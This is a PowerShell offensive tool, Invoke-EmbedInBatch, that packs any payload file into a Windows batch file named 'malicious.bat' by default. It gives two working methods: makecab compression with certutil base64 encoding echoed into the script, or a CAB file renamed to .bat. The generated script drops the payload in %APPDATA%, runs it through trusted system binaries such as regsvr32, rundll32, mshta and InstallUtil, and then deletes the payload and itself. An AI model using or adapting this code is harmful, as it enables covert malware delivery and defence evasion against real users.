function Invoke-EmbedInBatch
{
    <#
	.AUTHOR
	@Arno0x0x - Method 1 based on @xorrior work (New-RegSvr32BatchFile)
	
    .SYNOPSIS
    Generates a batch file embedding any payload file.
	
	This scripts proposes two methods of embedding arbitrary file within a batch file:
	
	METHOD 1:
		This method consists in embedding the payload within a real batch file
		To do so, the payload is:
			1. compressed with makecab
			2. then base64 encoded with certutil
		Eventually, the resulting base64 lines are embedded within a batch file along with a reversing process (decode, decompress) and then executing the final command.
		This methods comes with a payload size limit as a certain number of "echo" command in
		
		The resulting batch file will eventually cause cmd.exe to crash... (dunno why)
		
	METHOD 2:
		This method consists in creating a cab file embedding both the payload and
		a decompression and execution stub, and then rename this cab file into a batch file.
		This is a formally bad formated batch file, but it still works and gets executed by cmd.exe.
	
    .DESCRIPTION
    The resulting batch file will decode and decompress the cab file, then execute the payload given the specified command line

    .PARAMETER PayloadPath
    File path to the payload.
	
	.PARAMETER FinalCommandLine
    Command line to execute once the payload has been dropped on the traget system.
	It MUST contain a placeholder name "_payload_" that will be replaced by the actual payload location

	.PARAMETER Method
    Which batch file method to use (1 or 2). Defaults to '1'.
	
    .PARAMETER OutFile
    Path to output the resulting bat file. Defaults to 'malicious.bat'

    .PARAMETER TargetDropPath
    The path, on the target, where to drop the resulting payload.

    .EXAMPLE
    Invoke-EmbedInBatch -PayloadPath installUtil.dll -FinalCommandLine "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U _payload_"
	Invoke-EmbedInBatch -PayloadPath regsvr32.sct -FinalCommandLine "regsvr32.exe /s /u /i:_payload_ scrobj.dll"
	Invoke-EmbedInBatch -PayloadPath standard.dll -FinalCommandLine "rundll32.exe _payload_,entrypoint"
	Invoke-EmbedInBatch -PayloadPath payload.hta -FinalCommandLine "mshta.exe _payload_"
	Invoke-EmbedInBatch -PayloadPath payload.exe -FinalCommandLine "_payload_"
    
    #>
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [string]$PayloadPath,
		
		[Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [string]$FinalCommandLine,
		
		[Parameter()]
		[ValidateSet(1, 2)]
        [int]$Method = 1,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$OutFile = "malicious.bat",

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$TargetDropPath = "%APPDATA%"
    )

	#----------------------------------------------------------------------------------------
	# Perform arguments checking
	if (!(Test-Path $PayloadPath)) {
		Write-Host "[ERROR] File [$PayloadPath] not found"
		return -1 | Out-Null
	}
	
	if (!($FinalCommandLine -Match "_payload_")) {
		Write-Host "[ERROR] The FinalCommandLine argument should contain a '_payload_' placeholder. Check the EXAMPLE section."
		return -1 | Out-Null
	}
	
	#----------------------------------------------------------------------------------------
	# Retrieve the payload file name out of the payload path
	$PayloadFileName = Split-Path $PayloadPath -leaf
	
	$FinalCommandLine = $FinalCommandLine.Replace("_payload_", $TargetDropPath + "\" + $PayloadFileName)

	#========================================================================================
	# METHOD 1
	#========================================================================================
	if ($Method -eq 1) {
	
		Write-Host "[Using method 1]"
		
		#----------------------------------------------------------------------------------------
		# Create the compressed payload
		$res = makecab $PayloadPath payload.cab
		if ($res -eq $null) {
			Write-Host "[ERROR] Failure executing [makecab $Payload payload.cab]"
			return
		}
		
		#----------------------------------------------------------------------------------------
		# Base64 encode the compressed payload
		$res = certutil -encode payload.cab payload.txt
		if ($res -eq $null) {
			Write-Host "[ERROR] Failure executing [certutil -encode payload.cab payload.txt]"
			return
		}
		
		#----------------------------------------------------------------------------------------
		# So far so good, let's create the final batch file embedding the payload.txt version of the payload
		$BatchTemplate1 = @"
@echo off
SET outFile=`"$TargetDropPath\$PayloadFileName`"
SET dropPath="%TEMP%"
SET dropTXT="%dropPath%\debug.txt"
SET dropCAB="%dropPath%\debug.cab"
(
	ECHOCMDLINES
) > %dropTXT%
certutil -decode "%dropTXT%" "%dropCAB%" > NUL
expand %dropCAB% "%outFile%" > NUL
start /b $FinalCommandLine
timeout /t 5 /nobreak > NUL
del "%dropTXT%"
del "%dropCAB%"
del "%outFile%"
start /b "" cmd /c del "%~f0"&exit /b
"@

		$certUtilEncodedBinary = Get-Content -Encoding Ascii payload.txt
		$echolines = $certUtilEncodedBinary | % {"echo $_";$count+=1}

		$BatchTemplate1 = $BatchTemplate1.Replace("ECHOCMDLINES",$echolines -join "`n`t")
		$BatchTemplate1 = $BatchTemplate1 -creplace '(?m)^\s*\r?\n',''

		$BatchTemplate1 | Out-File -Encoding ascii $OutFile -Force

		Get-ChildItem -Path $OutFile
		
		#----------------------------------------------------------------------------------------
		# Cleanup temporary files
		Remove-Item payload.cab
		Remove-Item payload.txt
	}

	#========================================================================================
	# METHOD 2
	#========================================================================================
	elseif ($Method -eq 2) {
		Write-Host "[Using method 2]"
		
		$MakeCabTemplate = @"
.OPTION EXPLICIT ; Generate errors on variable typos
.Set DiskDirectoryTemplate="."
.Set CabinetNameTemplate="payload.cab"
.Set Cabinet=on
.Set Compress=off
.Set InfAttr= ; Turn off read-only, etc. attrs
setup.bat 
.Set Cabinet=on
.Set Compress=on
$PayloadPath
"@
		$SetupTemplate = @"

@echo off
SET outFile=`"$TargetDropPath\$PayloadFileName`"
expand %0 "$TargetDropPath" -F:* > NUL
start /b $FinalCommandLine
start /b "" cmd /c del "%~f0"&exit /b
del "%outFile%"
goto:eof
"@
		
		$MakeCabTemplate | Out-File -Encoding ascii "makecab.ddf" -Force
		$SetupTemplate | Out-File -Encoding ascii "setup.bat" -Force
		
		#----------------------------------------------------------------------------------------
		# Create the compressed payload
		$res = makecab /F "makecab.ddf"
		if ($res -eq $null) {
			Write-Host "[ERROR] Failure executing [makecab /F `"makecab.ddf`"]"
			return
		}

		Rename-Item payload.cab $OutFile
		
		Get-ChildItem -Path $OutFile
		
		#----------------------------------------------------------------------------------------
		# Cleanup temporary files
		Remove-Item makecab.ddf
		Remove-Item setup.bat
		Remove-Item setup.inf
		Remove-Item setup.rpt
	}
}